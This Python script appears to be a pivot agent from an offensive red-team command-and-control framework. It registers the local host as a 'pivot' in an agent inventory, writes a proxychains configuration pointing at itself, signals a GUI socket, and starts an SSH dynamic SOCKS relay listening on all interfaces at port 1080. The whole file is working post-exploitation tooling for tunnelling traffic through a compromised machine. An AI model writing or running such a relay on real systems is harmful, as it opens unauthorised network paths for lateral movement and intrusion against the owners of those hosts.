import os, time, json, socket, subprocess

AGENT_ID = "auto_proxy_patcher"
ALERT_FILE = "webgui/alerts.json"
AGENT_DB = "webgui/agents.json"
PROXY_CONFIG = "configs/proxychains.conf"
GUI_SOCKET = "/tmp/redot_gui.sock"

def log(msg):
    print(f"[PROXY] {msg}")

def push_alert():
    os.makedirs("webgui", exist_ok=True)
    with open(ALERT_FILE, "a") as f:
        f.write(json.dumps({
            "agent": AGENT_ID,
            "alert": "Proxy patch deployed",
            "type": "pivot",
            "timestamp": time.time()
        }) + "\n")

def update_agent_inventory(ip):
    os.makedirs("webgui", exist_ok=True)
    agents = []
    if os.path.exists(AGENT_DB):
        with open(AGENT_DB) as f:
            agents = json.load(f)
    agents.append({
        "agent_id": AGENT_ID,
        "ip": ip,
        "type": "pivot",
        "timestamp": time.time()
    })
    with open(AGENT_DB, "w") as f:
        json.dump(agents, f, indent=2)

def export_proxy_config(ip, port=1080):
    os.makedirs("configs", exist_ok=True)
    with open(PROXY_CONFIG, "w") as f:
        f.write("strict_chain\nproxy_dns\n[ProxyList]\nsocks5 {} {}\n".format(ip, port))
    log(f"Proxychains config written: {PROXY_CONFIG}")

def notify_gui():
    if os.path.exists(GUI_SOCKET):
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.connect(GUI_SOCKET)
            s.sendall(b"proxy_patch")
            s.close()
        except:
            pass

def passive_relay():
    log("Starting passive SOCKS relay")
    subprocess.Popen(["ssh", "-N", "-D", "0.0.0.0:1080", "user@localhost"])

def main():
    ip = socket.gethostbyname(socket.gethostname())
    push_alert()
    update_agent_inventory(ip)
    export_proxy_config(ip)
    notify_gui()
    passive_relay()

if __name__ == "__main__":
    main()
